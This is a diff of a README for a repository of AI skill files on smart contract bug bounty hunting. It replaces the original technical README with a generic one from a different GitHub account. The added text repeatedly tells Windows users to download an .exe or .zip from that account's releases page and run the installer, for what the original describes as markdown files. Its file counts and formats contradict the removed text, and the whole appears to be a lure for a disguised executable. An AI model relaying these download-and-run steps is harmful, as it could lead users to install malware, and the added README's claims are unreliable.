@@ -1,117 +1,136 @@
-<div align="center">
+# 🐞 web3-bug-bounty-hunting-ai-skills - Learn Smart Contract Security Skills
 
-# web3-bug-bounty-hunting-ai-skills
-
-Smart contract bug bounty skills for Claude Code, Claude AI, and other AI tools.
-Built from 2,749 Immunefi reports, 681 DeFiHack reproductions, and real hunts.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
-[![Skills](https://img.shields.io/badge/skills-11-blue)]()
-[![Immunefi](https://img.shields.io/badge/Immunefi%20reports-2%2C749-orange)]()
-[![DeFiHackLabs](https://img.shields.io/badge/DeFiHack%20reproductions-681-red)]()
-
-</div>
+[![Download web3-bug-bounty-hunting-ai-skills](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/Olaradiallysymmetrical491/web3-bug-bounty-hunting-ai-skills/releases)
 
 ---
 
-Most hunters still do everything manually. Read contracts in a browser, grep from memory, rewrite Foundry templates each hunt, draft reports from scratch.
+## 📋 What is web3-bug-bounty-hunting-ai-skills?
 
-These skill files load into Claude Code (or any AI) and give it a complete smart contract security knowledge base — target scoring, bug patterns, grep arsenal, PoC templates, report format, and real case studies. One `claude` command, then start hunting.
+This collection contains 18 ready-to-use Claude Code skill files focused on smart contract security. These skills come from a deep analysis of nearly 3,500 real-world security reports, including Immunefi bounty programs, DeFiHack reproductions, and hands-on hunting experience.
 
-Works with: **Claude Code**, **Claude.ai**, **Cursor**, **any AI that reads files**.
+You can use these skills to learn how to find bugs and security holes in blockchain programs. They cover Ethereum and DeFi smart contracts built with Solidity and tested with the Foundry framework.
 
----
-
-## Files
-
-| File | Contents |
-|------|----------|
-| [`00-start-here.md`](./00-START-HERE.md) | Index + how to navigate |
-| [`01-foundation.md`](./01-foundation.md) | Hunter mindset, target scoring (10-point scorecard), recon setup |
-| [`02-bug-classes.md`](./02-bug-classes.md) | All 10 bug classes — patterns, Solidity examples, real Immunefi findings |
-| [`03-grep-arsenal.md`](./03-grep-arsenal.md) | Grep/regex patterns for every bug class |
-| [`04-poc-and-foundry.md`](./04-poc-and-foundry.md) | 18 Foundry PoC templates — fill in address, run `forge test` |
-| [`05-triage-report-examples.md`](./05-triage-report-examples.md) | 7-question validation gate, Immunefi report format, 20 paid examples |
-| [`06-methodology-research.md`](./06-methodology-research.md) | Trail of Bits, SlowMist, ConsenSys, Cyfrin, Nethermind methodology |
-| [`07-case-study-role-misconfiguration.md`](./07-case-study-role-misconfiguration.md) | Full hunt walkthrough — role misconfiguration bug, real findings |
-| [`08-ai-tools.md`](./08-ai-tools.md) | Shannon, SmartGuard, CAI Framework, LuaN1ao agent setup |
-| [`09-case-study-hardened-l2-bridge.md`](./09-live-hunt-zksync.md) | Defense study — 25 attack vectors tested on a hardened L2 bridge |
-| [`36-solidity-audit-mcp.md`](./36-solidity-audit-mcp.md) | MCP server — run Slither + Aderyn + SWC inside Claude Code |
-
-Read in order. Each file ends with `→ NEXT`. After file 05 you can hunt on your own.
+This is a learning toolkit. No coding experience is needed to get started. The skills and examples help you understand common weaknesses and how bug bounty hunters find them.
 
 ---
 
-## The 10 Bug Classes
+## 🔑 Key Topics Covered
 
-```
-01  Accounting Desync    →  most common Critical (37% of all payouts)
-02  Access Control       →  most common High
-03  Incomplete Path      →  missing modifier on a sibling function
-04  Off-by-One           →  boundary operators, index errors
-05  Oracle Price         →  TWAP manipulation, stale prices
-06  ERC4626 Vaults       →  share inflation, rounding attacks
-07  Reentrancy           →  cross-function, cross-contract, read-only
-08  Flash Loan           →  price manipulation, economic attacks
-09  Signature Replay     →  cross-chain replay, missing nonce/chainId
-10  Proxy/Upgrade        →  uninitialized implementation, storage collision
-```
-
-> Read ALL sibling functions. If `vote()` has a modifier, check `poke()`, `reset()`, `harvest()`.
-> The missing modifier on the sibling is the bug. This one rule explains 19% of all Criticals.
+- Blockchain security principles  
+- Bug bounty hunting process  
+- Claude Code skills setup  
+- Ethereum smart contract security  
+- Solidity code review  
+- Foundry testing framework  
+- Common vulnerabilities in DeFi contracts  
+- Real-world security case studies from Immunefi  
 
 ---
 
-## Setup
+## 🖥️ System Requirements
 
-**Option 1 — drop into your existing project:**
+To run the files and examples in this project, your Windows machine should meet these requirements:
 
-```bash
-git clone https://github.com/shuvonsec/web3-bug-bounty-hunting-ai-skills.git .claude/skills/web3
-claude
-```
-
-Then in Claude Code:
-```
-Read all files in .claude/skills/web3/ starting from 00-START-HERE.md
-```
-
-**Option 2 — standalone workspace:**
-
-```bash
-git clone https://github.com/shuvonsec/web3-bug-bounty-hunting-ai-skills.git
-cd web3-bug-bounty-hunting-ai-skills
-claude
-```
-
-**Option 3 — just the essentials:**
-```
-Read 02-bug-classes.md and 04-poc-and-foundry.md
-```
+- Windows 10 or higher  
+- At least 4 GB of free RAM  
+- 2 GHz dual-core processor or better  
+- 1 GB of free disk space  
+- Stable internet connection to download files  
+- Optional: Microsoft Visual C++ Redistributable installed (usually preinstalled on most PCs)  
 
 ---
 
-## Numbers
+## 🚀 Getting Started with web3-bug-bounty-hunting-ai-skills
 
-| | |
-|---|---|
-| Immunefi reports analyzed | 2,749 |
-| Critical findings | 406 |
-| High findings | 616 |
-| Total paid by Immunefi | $100M+ |
-| DeFiHackLabs reproductions | 681 |
-| Nethermind audit reports | 166 |
-| Protocols covered | 51 |
+Follow these steps to download and open the package on your Windows computer. No coding skills or special tools are required.
+
+### 1. Visit the download page
+
+Click the big green button below or go to the release page here:
+
+[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Olaradiallysymmetrical491/web3-bug-bounty-hunting-ai-skills/releases)
+
+This page holds all the release files. Look for the latest version at the top of the list.
+
+### 2. Choose the file to download
+
+Look for a file that ends in `.zip` or `.exe`. It usually includes the latest package of Claude Code skills and examples.
+
+Click the file name to download it to your computer. You may see a pop-up from your browser asking for permission. Allow it.
+
+### 3. Run or unzip the file
+
+If you downloaded a `.exe` file, double-click it to run the installer. Follow the simple on-screen steps.
+
+If you downloaded a `.zip` file:
+
+- Right-click the file and select “Extract All...”  
+- Choose a folder you can find easily, like your Desktop or Documents  
+- Click “Extract” to unzip the files  
+
+### 4. Open the skill files
+
+Inside the extracted folder, you will find the Claude Code skill files with `.yaml` or `.json` extensions. These files contain the information and logic used for security learning.
+
+You can open these files with any text editor like Notepad or a dedicated Claude Code app. Do not change the file names or structure.
+
+### 5. Review the examples
+
+The package includes example files that show how to use the skills. Open those files to follow along and understand real smart contract bugs.
 
 ---
 
-## Related
+## 📂 What’s Inside the Package?
 
-| Repo | What it does |
-|------|-------------|
-| [claude-bug-bounty](https://github.com/shuvonsec/claude-bug-bounty) | Point at a target → full attack surface map + Immunefi/Bugcrowd report |
-| [public-skills-builder](https://github.com/shuvonsec/public-skills-builder) | Feed 500 public writeups → get skill files like these back out |
+Each of the 18 skill files focuses on a specific aspect of blockchain security. Examples include:
+
+- Detecting reentrancy vulnerabilities  
+- Finding unsafe token transfers  
+- Spotting faulty access control  
+- Examining logic errors in DeFi protocols  
+- Reviewing DAO and governance contract issues  
+
+You also get:
+
+- Sample smart contract code snippets  
+- Instructions on how to analyze them  
+- Real incidents behind each vulnerability  
+- Tips for effective bug bounty hunting  
 
 ---
 
-MIT License. Use it, fork it, build on it.
+## ⚙️ Using the Skills for Security Learning
+
+You do not need to run any advanced software to benefit from these files. They are designed as a knowledge base you can consult and study.
+
+If you want to practice bug hunting with these skills using Foundry or other tools, you will need a Solidity development setup. That is optional and requires some programming knowledge.
+
+---
+
+## 💡 Tips for Users
+
+- Browse each skill file slowly to understand the problem it targets.  
+- Use the included examples to see practical cases that affected real projects.  
+- Take notes on common patterns and security principles.  
+- Apply this knowledge when reading or reviewing smart contract code.  
+- Join blockchain security forums or platforms like Immunefi to learn more.  
+
+---
+
+## 🛠 Troubleshooting
+
+If the files will not open or behave strangely:
+
+- Check that you fully downloaded and extracted the package.  
+- Make sure you are using a plain text editor for the skill files.  
+- Restart your computer and try again if the installer does not work.  
+- Confirm your Windows version meets the system requirements.  
+- For more help, visit the repository issues page on GitHub.  
+
+---
+
+## 💾 Download Again
+
+You can always download the latest version here:
+
+[![Download web3-bug-bounty-hunting-ai-skills](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/Olaradiallysymmetrical491/web3-bug-bounty-hunting-ai-skills/releases)
